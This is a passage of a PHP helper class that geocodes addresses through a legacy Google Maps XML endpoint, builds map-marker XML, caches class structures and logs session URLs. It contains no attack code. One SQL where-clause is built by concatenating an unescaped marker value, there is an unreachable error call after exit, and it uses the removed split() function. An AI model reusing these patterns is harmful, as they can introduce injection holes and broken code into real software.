		if(isset($_SESSION['address_data']['id']) && $_SESSION['address_data']['id'] == md5($address) && $mode == 'location') return $_SESSION['address_data'];
		$base_url = "http://maps.google.com/maps/geo?output=xml&key=".Registry::getParam('Config','google_api_key');
		$request_url = $base_url . "&q=" . urlencode($address);
		$xml = simplexml_load_file($request_url) or die("url not loading");
		$status = $xml->Response->Status->code;
		if($debug) print_r($xml);
		if($status == '200') {
			switch($mode) {
				case 'location' :
					$data = array();
					$data['id'] = md5($address);
					$data['address'] = (string) $xml->Response->Placemark->address;
					$data['country_code'] = (string) $xml->Response->Placemark->AddressDetails->Country->CountryNameCode;
					$data['country'] = (string) $xml->Response->Placemark->AddressDetails->Country->CountryName;
					$data['state'] = (string) $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->AdministrativeAreaName;
					if(isset($xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->SubAdministrativeArea->SubAdministrativeAreaName)) {
						$data['city'] = (string) $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->SubAdministrativeArea->Locality->LocalityName;
						$data['zip'] = (string) $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->SubAdministrativeArea->Locality->PostalCode->PostalCodeNumber;
					} else {
						$data['city'] = (string) $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->Locality->LocalityName;
						$data['zip'] = (string) $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->Locality->PostalCode->PostalCodeNumber;
					}
					$_SESSION['address_data']['id'] = $data;
					return $data;
					break;
				default :
					$coordinates = $xml->Response->Placemark->Point->coordinates;
					$coordinatesSplit = split(",", $coordinates);
					// Format: Longitude, Latitude, Altitude
					$lat = $coordinatesSplit[1];
					$lng = $coordinatesSplit[0];
					if($debug) $this->dump('Coords',$coordinates);
					return array($lat,$lng);
					break;
			}
		} elseif($status == '602') {
			Error::websiteError('Address Failed to GeoCode - Status #602');
		} else {
			exit;
			Error::websiteError('Address could not be found, please use google maps to verify the address :: '.$address);
		}
		return '';
	}

	/**
	* createGoogleMapsXML : create the xml required for google maps
	*
	* @param string		$address 	full address
	* @param integer	$debug  	print out debug information
	* @access public
	* @return array
	**/ 
	public function createGoogleMapsXML($data,$debug=null) {
		if(!is_null($debug)) $this->dump('Google Maps Markers',$data);
		$document = new DOMDocument('1.0');
		$document->formatOutput = true;	// format the output so I can read the source
		$node = $document->createElement("markers");	// root node is schema
		$subnode = $document->appendChild($node);
		foreach($data as $marker) {
			$node = $document->createElement('marker');
			$newnode = $subnode->appendChild($node);
			$newnode->setAttribute('name',$marker['name']);
			$newnode->setAttribute('address',preg_replace('/,/','<br />',$marker['address'],1));
			$newnode->setAttribute('lat',$marker['lat']);
			$newnode->setAttribute('lng',$marker['lng']);
			$newnode->setAttribute('distance',$marker['distance']);
			if(isset($marker['phone'])) $newnode->setAttribute('phone',$marker['phone']);
			if(isset($marker['website'])) $newnode->setAttribute('website',$marker['website']);
			if(isset($marker['email'])) $newnode->setAttribute('email',$marker['email']);
			
			//	public function getTable($table,$where=null,$list=null,$join=null,$join_id=null,$limit=null,$order=null,$page=null,$cols=null,$query=null,$group=null,$debug=null) {
			if(isset($marker['type_id'])) {
				list($marker['type_id']) = $this->getTable('client_types','active=1 and id = '.$marker['type_id'],true,null,null,'1',null,null,'title');
				$newnode->setAttribute('type_id',$marker['type_id']);
			}
		}
		
		$xml =  $document->saveXML();
		if(!is_null($debug)) $this->dump('Google Maps XML',$xml);
		return $xml;
	}
	
	
	/**
	* pointer to parseQuery
	*
	* @param string		$str url
	* @access public
	* @return array
	**/ 
	public function parseQuery($str) {
		return Utilities::parseQuery($str);
	}
	
	/**
	* classToXML - convert a class structure into a 
	*
	* @param string		$className		name of the class as it corresponds to className.class.php in libs
	* @access public
	* @return null
	**/ 
	public function classToXML($className) {
		return;	// disabled
		include_once('Array2XML.class.php');
		
		// where to save xml files
		$location = 'libs/xmlClasses/'.$className.'.xml';
		
		// get the core from the registry
		$Class = Registry::getKey($className);
		
		// get the class methods (internal method) easier to search this way
		$methods = get_class_methods($Class);
		
		// start with the timestamp so we can know when to update the cache
		$arr = array('timestamp' => date ("y:m:d:H:i:s", filemtime(Registry::getParam('Config','file_dir').'libs/'.$className.'.class.php')));
		
		// add all the methods as elements
		foreach($methods as $method) {
			$cmeth = new ReflectionMethod($className, $method);
			$args = $cmeth->getParameters();
			$arr[$method] = array();
			foreach($args as $arg) {
				$arr[$method][$arg->getName()] = $arg->isOptional();
			}
		}
		
		$xml = new array2xml('Core',$arr);
		$xml->createNode($arr);
		file_put_contents(Registry::getParam('Config','file_dir').'libs/xmlClasses/'.$className.'.xml',$xml);
	}
	
	/**
	* updateClassXml will open the cache files and apply them to the registry. If they aren't available or out of date, they will be updated first.
	*
	* @access public
	* @return array
	**/ 
	public function updateClassXML() {
		$classes = array('Core','Commerce','Cart');	// only classes with function.class.php files in libs/plugins
		$file_dir = Registry::getParam('Config','file_dir');
		$structure = array();
		foreach($classes as $class) {
			// see if a cache file does not exist
			if (!file_exists($file_dir.'libs/xmlClasses/'.$class.'.xml')) {
				$this->classToXML($class);	// create one
			} else {			
				// get the cache file
				$filecontents = file_get_contents($file_dir.'libs/xmlClasses/'.$class.'.xml');
				$xml = simplexml_load_string($filecontents);
				
				// see if the timestamps match
				if($xml->timestamp != date ("y:m:d:H:i:s", filemtime($file_dir.'libs/'.$class.'.class.php'))) {
					//echo $xml['timestamp'].' -- '.date ("y:m:d:H:i:s", filemtime('libs/'.$class.'.class.php')).'<br />';
					
					$this->classToXML($class);	// cache if the timestamps do not match
				}
				
				// else add it to the structure;
				$structure[$class] = $xml->asXML();
			}
		}
		return $structure;
	}
	
	/**
	* Display profiler benchmark information
	*
	* @access public
	* @return null
	**/ 
	function displayBenchmark() {
		$profiler = Registry::getKey('Profiler');
		$profiler->display(Registry::getKey('Database'));
	}
	
	/**
	* Log a url to the session so the website can redirect intelligently
	*
	* @access public
	* @return null
	**/ 
	function logUrl($url=null) {
		if(!isset($_SESSION['url_log'])) $_SESSION['url_log'] = array();
		array_push($_SESSION['url_log'],$url ? $url : 'home');
		if(count($_SESSION['url_log']) > 5) $_SESSION['url_log'] = array_slice($_SESSION['url_log'],-5,5);	// get the last 5
	}
	
	/*
	* Giving Smarty access to the registry dump
	*/
	function dumpRegistry($b=null) {
		$reg = Registry::$_store;
		$flagged = array('Smarty','Core','Admin','Cart','Registry','Paypal','ClassStructure','Error','Database','Commerce','Fedex');
		foreach($flagged as $k=>$f) unset($reg[$f]);
		$this->dump('Registry',$reg);
	}
}
?>